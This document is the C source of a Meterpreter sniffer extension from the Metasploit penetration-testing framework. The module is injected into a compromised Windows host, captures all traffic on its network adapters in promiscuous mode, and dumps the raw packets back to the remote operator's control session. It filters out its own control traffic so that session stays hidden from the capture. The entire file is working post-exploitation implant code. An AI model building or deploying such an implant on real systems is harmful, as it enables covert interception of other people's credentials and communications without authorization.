/*
 * This module implements packet sniffing features 
 */
#define _CRT_SECURE_NO_DEPRECATE 1
#include "../../common/common.h"

#include "sniffer.h"

#include "../../ReflectiveDLLInjection/DelayLoadMetSrv.h"
// include the Reflectiveloader() function, we end up linking back to the metsrv.dll's Init function
// but this doesnt matter as we wont ever call DLL_METASPLOIT_ATTACH as that is only used by the 
// second stage reflective dll inject payload and not the metsrv itself when it loads extensions.
#include "../../ReflectiveDLLInjection/ReflectiveLoader.c"

// this sets the delay load hook function, see DelayLoadMetSrv.h
EnableDelayLoadMetSrv();

HANDLE hMgr;
DWORD hErr;

struct sockaddr peername;
int peername_len;

struct sockaddr_in *peername4;
struct sockaddr_in6 *peername6;

int sniffer_includeports[1024];
int sniffer_excludeports[1024];

CRITICAL_SECTION sniffercs;

#define SNIFFER_MAX_INTERFACES 128
#define SNIFFER_MAX_QUEUE  210000 // ~300Mb @ 1514 bytes

CaptureJob open_captures[SNIFFER_MAX_INTERFACES];

DWORD request_sniffer_interfaces(Remote *remote, Packet *packet);
DWORD request_sniffer_capture_start(Remote *remote, Packet *packet);
DWORD request_sniffer_capture_stop(Remote *remote, Packet *packet);
DWORD request_sniffer_capture_stats(Remote *remote, Packet *packet);
DWORD request_sniffer_capture_dump(Remote *remote, Packet *packet);
HANDLE pktsdk_interface_by_index(unsigned int fidx);
DWORD pktsdk_initialize(void);

void __stdcall sniffer_queue_receive(DWORD_PTR Param, DWORD_PTR ThParam, HANDLE hPacket, LPVOID pPacketData, DWORD IncPacketSize);


#define check_pssdk(); if(!hMgr && pktsdk_initialize()!=0){packet_transmit_response(hErr, remote, response);return(hErr);}

DWORD pktsdk_initialize(void) {
	hMgr = MgrCreate();
	if(! hMgr){
		dprintf("sniffer>> failed to allocate a new Mgr object");
		hErr = ERROR_ACCESS_DENIED;
		return(hErr);
	}
	
	hErr = MgrInitialize(hMgr);
	if(hErr != HNERR_OK) {
		MgrDestroy(hMgr);
		hMgr = NULL;
	}

	dprintf("sniffer>> Mgr object initialized with return %d (handle %d)", hErr, hMgr);
	return hErr;
}

HANDLE pktsdk_interface_by_index(unsigned int fidx) {
	unsigned idx = 1;
	HANDLE hCfg;
	
	dprintf("sniffer>> pktsdk_interface_by_index(%d)", fidx);

	hCfg = MgrGetFirstAdapterCfg(hMgr);
	do {
		if(fidx == idx++) return hCfg;
	}while((hCfg = MgrGetNextAdapterCfg(hMgr,hCfg)) != NULL);
	return NULL;
}


DWORD request_sniffer_interfaces(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);
	Tlv entries[8];

	/*
		0: Index
		1: Name
		2: Description
		3: Type
		4: MTU
		5: Wireless?
		6: Accessible?
		7: DHCP?
	*/
	unsigned int idx = 1;
	HANDLE hCfg;
	
	check_pssdk();

	hCfg = MgrGetFirstAdapterCfg(hMgr);

	do
	{
		unsigned char *aname = (unsigned char *)AdpCfgGetAdapterNameA(hCfg);
		unsigned char *adesc = (unsigned char *)AdpCfgGetAdapterDescriptionA(hCfg);
		unsigned int ahand = htonl((unsigned int)hCfg); 
		unsigned int atype = htonl(AdpCfgGetAdapterType(hCfg));
		unsigned int amtu  = htonl(AdpCfgGetMaxPacketSize(hCfg));
		unsigned int aidx  = htonl(idx);

		BOOL awireless = AdpCfgIsWireless(hCfg);
		BOOL ausable   = AdpCfgGetAccessibleState(hCfg);
		BOOL adhcp     = AdpCfgGetDhcpState(hCfg);

		memset(entries, 0, sizeof(entries));

		dprintf("sniffer>> interface %d - %s - %s", idx, aname, adesc);

		entries[0].header.type   = TLV_TYPE_UINT;
		entries[0].header.length = sizeof(unsigned int);
		entries[0].buffer        = (PUCHAR)&aidx;

		entries[1].header.type   = TLV_TYPE_STRING;
		entries[1].header.length = strlen(aname)+1;
		entries[1].buffer        = aname;

		entries[2].header.type   = TLV_TYPE_STRING;
		entries[2].header.length = strlen(adesc)+1;
		entries[2].buffer        = adesc;

		entries[3].header.type   = TLV_TYPE_UINT;
		entries[3].header.length = sizeof(unsigned int);
		entries[3].buffer        = (PUCHAR)&atype;

		entries[4].header.type   = TLV_TYPE_UINT;
		entries[4].header.length = sizeof(unsigned int);
		entries[4].buffer        = (PUCHAR)&amtu;

		entries[5].header.type   = TLV_TYPE_BOOL;
		entries[5].header.length = sizeof(BOOL);
		entries[5].buffer        = (PUCHAR)&awireless;

		entries[6].header.type   = TLV_TYPE_BOOL;
		entries[6].header.length = sizeof(BOOL);
		entries[6].buffer        = (PUCHAR)&ausable;

		entries[7].header.type   = TLV_TYPE_BOOL;
		entries[7].header.length = sizeof(BOOL);
		entries[7].buffer        = (PUCHAR)&adhcp;

		packet_add_tlv_group(response, TLV_TYPE_SNIFFER_INTERFACES, entries, 8);

		idx++;
	}while((hCfg = MgrGetNextAdapterCfg(hMgr,hCfg)) != NULL);

	packet_transmit_response(ERROR_SUCCESS, remote, response);
	return ERROR_SUCCESS;
}



void __stdcall sniffer_receive(DWORD_PTR Param, DWORD_PTR ThParam, HANDLE hPacket, LPVOID pPacketData, DWORD IncPacketSize) {
	CaptureJob *j;
	HANDLE pkt;
	unsigned char *pktbuf;
	unsigned char *pktmax;
	ETHERNET_HEADER *eth;
	IP_HEADER *ip;
	TCP_HEADER *tcp;
	UDP_HEADER *udp;


	j = (CaptureJob *)Param;
	pktbuf = (unsigned char *)pPacketData;
	pktmax = pktbuf + IncPacketSize;


	// Only process active jobs
	if(!j->active) return;

	// Traffic filtering goes here
	do {
		// Skip matching on short packets
		if(IncPacketSize < sizeof(ETHERNET_HEADER)+sizeof(IP_HEADER)+sizeof(TCP_HEADER)){
			dprintf("sniffer>> skipping exclusion because the packet is too small");	
		}

		// Match IP packets
		if(! peername4)  {
			dprintf("sniffer>> skipping exclusion because peername4 is not defined");
			break;
		}

		// Skip non-IP packets
		eth = (ETHERNET_HEADER *) pktbuf;
		if(ntohs(eth->EthType) != ETHERTYPE_IP) {
			dprintf("sniffer>> skipping non-IP packet from filter");
			break;
		}

		// Skip non-TCP/UDP packets
		ip = (IP_HEADER *)&pktbuf[sizeof(ETHERNET_HEADER)];
		if(ip->Protocol != IPPROTO_TCP && ip->Protocol != IPPROTO_UDP) {
			dprintf("sniffer>> skipping non-TCP/UDP packet from filter: %d", ip->Protocol);
			break;
		}

		if(ip->Protocol == IPPROTO_TCP) {
			tcp = (TCP_HEADER *)&pktbuf[sizeof(ETHERNET_HEADER) + (ip->Len * 4)];
			if( (unsigned char *)tcp + sizeof(TCP_HEADER) > pktmax) {
				dprintf("sniffer>> TCP packet is too short");
				break;
			}
			
			// Ignore our own control session's traffic
			if ( (memcmp(&ip->SrcAddr,  &peername4->sin_addr, 4) == 0 && tcp->Sport == peername4->sin_port) ||
				 (memcmp(&ip->DestAddr, &peername4->sin_addr, 4) == 0 && tcp->Dport == peername4->sin_port) ) {
				return;
			}
			// TODO: Scan through a list of included/excluded ports
		}

		// All done matching exclusions
	} while(0);


	// Thread-synchronized access to the queue
	EnterCriticalSection(&sniffercs);

	if(j->idx_pkts >= j->max_pkts) j->idx_pkts = 0;
	j->cur_pkts++;
	j->cur_bytes += IncPacketSize;
	
	pkt = PktCreate(j->mtu);
	PktCopyPacketToPacket(pkt, hPacket);
	if(j->pkts[j->idx_pkts])
			PktDestroy(j->pkts[j->idx_pkts]);
	j->pkts[j->idx_pkts] = pkt;
	j->idx_pkts++;

	LeaveCriticalSection(&sniffercs);
}

DWORD request_sniffer_capture_start(Remote *remote, Packet *packet) {
	Packet *response = packet_create_response(packet);
	unsigned int ifid;
	unsigned int maxp;
	CaptureJob *j;
	DWORD result;
	HANDLE ifh;

	check_pssdk();
	dprintf("sniffer>> start_capture()");

	ifid = packet_get_tlv_value_uint(packet,TLV_TYPE_SNIFFER_INTERFACE_ID);
	maxp = packet_get_tlv_value_uint(packet,TLV_TYPE_SNIFFER_PACKET_COUNT);
	maxp = min(maxp, 200000);
	maxp = max(maxp, 1);

	result = ERROR_SUCCESS;

	do {
		// the interface is invalid
		if(ifid == 0 || ifid >= SNIFFER_MAX_INTERFACES) {
			result = ERROR_INVALID_PARAMETER;
			break;
		}

		ifh = pktsdk_interface_by_index(ifid);
		if(ifh == NULL) {
			result = ERROR_INVALID_PARAMETER;
			break;		
		}

		j = &open_captures[ifid];

		// the interface is already being captured
		if(j->active) {
			result = ERROR_INVALID_PARAMETER;
			break;
		}

		j->adp = AdpCreate();
		dprintf("sniffer>> capture_start() AdpCreate: 0x%.8x", j->adp);

		AdpSetConfig(j->adp,ifh);
		hErr = AdpOpenAdapter(j->adp);
		dprintf("sniffer>> capture_start() AdpOpenAdapter: 0x%.8x", hErr);
		if (hErr != HNERR_OK) { 
			AdpDestroy(j->adp);
			result = hErr;
			break;
		}
		
		j->pkts = calloc(maxp, sizeof(HANDLE));
		if(j->pkts == NULL) {
			AdpCloseAdapter(j->adp);
			AdpDestroy(j->adp);
			result = ERROR_ACCESS_DENIED;
			break;
		}

		j->active   = 1;
		j->intf     = ifid;
		j->max_pkts = maxp;
		j->cur_pkts = 0;
		j->mtu      = AdpCfgGetMaxPacketSize(AdpGetConfig(j->adp));

		AdpSetOnPacketRecv(j->adp, (FARPROC) sniffer_receive, (DWORD_PTR)j);
		AdpSetMacFilter(j->adp, mfAll);
	} while(0);
	
	packet_transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}

DWORD request_sniffer_capture_stop(Remote *remote, Packet *packet) {
	Packet *response = packet_create_response(packet);
	unsigned int ifid;
	CaptureJob *j;
	DWORD result;

	check_pssdk();
	dprintf("sniffer>> stop_capture()");

	ifid = packet_get_tlv_value_uint(packet,TLV_TYPE_SNIFFER_INTERFACE_ID);
	dprintf("sniffer>> stop_capture(0x%.8x)", ifid);

	result = ERROR_SUCCESS;

	do {
		// the interface is invalid
		if(ifid == 0 || ifid >= SNIFFER_MAX_INTERFACES) {
			result = ERROR_INVALID_PARAMETER;
			break;
		}
		
		j = &open_captures[ifid];

		// the interface is not being captured
		if(! j->adp) {
			result = ERROR_INVALID_PARAMETER;
			break;
		}

		j->active = 0;
		AdpCloseAdapter(j->adp);
		AdpDestroy(j->adp);
		free(j->pkts);
		memset(j, 0, sizeof(CaptureJob));

		dprintf("sniffer>> stop_capture() interface %d processed %d packets/%d bytes", j->intf, j->cur_pkts, j->cur_bytes); 
	} while(0);
	
	packet_transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}



DWORD request_sniffer_capture_stats(Remote *remote, Packet *packet) {
	Packet *response = packet_create_response(packet);
	unsigned int ifid;
	CaptureJob *j;
	DWORD result;

	check_pssdk();
	dprintf("sniffer>> capture_stats()");

	ifid = packet_get_tlv_value_uint(packet,TLV_TYPE_SNIFFER_INTERFACE_ID);
	dprintf("sniffer>> capture_stats(0x%.8x)", ifid);

	result = ERROR_SUCCESS;

	do {
		// the interface is invalid
		if(ifid == 0 || ifid >= SNIFFER_MAX_INTERFACES) {
			result = ERROR_INVALID_PARAMETER;
			break;
		}
		
		j = &open_captures[ifid];

		// the interface was not captured
		if(! j->adp) {
			result = ERROR_INVALID_PARAMETER;
			break;
		}

		packet_add_tlv_uint(response, TLV_TYPE_SNIFFER_PACKET_COUNT, j->cur_pkts);
		packet_add_tlv_uint(response, TLV_TYPE_SNIFFER_BYTE_COUNT, (unsigned int) j->cur_bytes);
	} while(0);
	
	packet_transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}


DWORD request_sniffer_capture_dump(Remote *remote, Packet *packet) {
	Packet *response = packet_create_response(packet);
	unsigned int ifid;
	CaptureJob *j;
	DWORD result,pcnt,bcnt,rcnt,i;
	DWORD thi, tlo;

	check_pssdk();
	dprintf("sniffer>> capture_dump()");

	ifid = packet_get_tlv_value_uint(packet,TLV_TYPE_SNIFFER_INTERFACE_ID);
	dprintf("sniffer>> capture_dump(0x%.8x)", ifid);

	result = ERROR_SUCCESS;

	do {
		// the interface is invalid
		if(ifid == 0 || ifid >= SNIFFER_MAX_INTERFACES) {
			result = ERROR_INVALID_PARAMETER;
			break;
		}
		
		j = &open_captures[ifid];

		// the interface was not captured
		if(! j->adp) {
			result = ERROR_INVALID_PARAMETER;
			break;
		}

		EnterCriticalSection(&sniffercs);

		bcnt = j->cur_bytes;
		pcnt = j->cur_pkts;
		rcnt = 0;

		packet_add_tlv_uint(response, TLV_TYPE_SNIFFER_PACKET_COUNT, pcnt);
		packet_add_tlv_uint(response, TLV_TYPE_SNIFFER_BYTE_COUNT, bcnt);

		for(i=0; i<j->max_pkts; i++) {
			if(!j->pkts[i]) break;
			tlo = PktGetTimeStamp(j->pkts[i], &thi);
			packet_add_tlv_uint(response, TLV_TYPE_UINT, PktGetId(j->pkts[i], NULL));
			packet_add_tlv_uint(response, TLV_TYPE_UINT, thi);
			packet_add_tlv_uint(response, TLV_TYPE_UINT, tlo);
			packet_add_tlv_raw(
				response, 
				TLV_TYPE_SNIFFER_PACKET, 
				PktGetPacketData(j->pkts[i]),
				PktGetPacketSize(j->pkts[i])
			);
			PktDestroy(j->pkts[i]);
			j->pkts[i] = NULL;
		}
		dprintf("sniffer>> finished processing packets");

		j->cur_bytes = 0;
		j->cur_pkts  = 0;
		j->idx_pkts  = 0;

		LeaveCriticalSection(&sniffercs);

	} while(0);
	
	packet_transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}

Command customCommands[] =
{
	// List interfaces
	{ "sniffer_interfaces",
	  { request_sniffer_interfaces,                          { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                        },
	},
	// Start sniffing
	{ "sniffer_capture_start",
	  { request_sniffer_capture_start,                       { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                        },
	},
	// Stop sniffing
	{ "sniffer_capture_stop",
	  { request_sniffer_capture_stop,                        { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                        },
	},
	// Sniffing stats
	{ "sniffer_capture_stats",
	  { request_sniffer_capture_stats,                       { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                        },
	},
	// Sniffing dump
	{ "sniffer_capture_dump",
	  { request_sniffer_capture_dump,                        { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                        },
	},
	// Terminator
	{ NULL,
	  { EMPTY_DISPATCH_HANDLER                      },
	  { EMPTY_DISPATCH_HANDLER                      },
	}
};

/*
 * Initialize the server extension
 */
DWORD __declspec(dllexport) InitServerExtension(Remote *remote)
{
	DWORD index;

	hMetSrv = remote->hMetSrv;

	for (index = 0;
	     customCommands[index].method;
	     index++)
		command_register(&customCommands[index]);

	// initialize structures for the packet sniffer sdk
	hMgr = NULL;
	hErr = 0;
	memset(open_captures, 0, sizeof(open_captures));

	// wipe the include/exclude ports empty
	memset(sniffer_includeports, 0, sizeof(sniffer_includeports));
	memset(sniffer_excludeports, 0, sizeof(sniffer_excludeports));
	sniffer_includeports[0] = -1;
	sniffer_excludeports[0] = -1;	
	
	// get the address/port of the connected control socket
	peername4 = NULL;
	peername6 = NULL;
	peername_len = sizeof(peername);
	getpeername(remote->fd, &peername, &peername_len);
	if(peername.sa_family == PF_INET)  peername4 = (struct sockaddr_in *)&peername;
	if(peername.sa_family == PF_INET6) peername6 = (struct sockaddr_in6 *)&peername;

	InitializeCriticalSection(&sniffercs);
	return hErr;
}

/*
 * Deinitialize the server extension
 */
DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
{
	DWORD index;

	for (index = 0;
	     customCommands[index].method;
	     index++)
		command_deregister(&customCommands[index]);
	MgrDestroy(hMgr);
	return ERROR_SUCCESS;
}
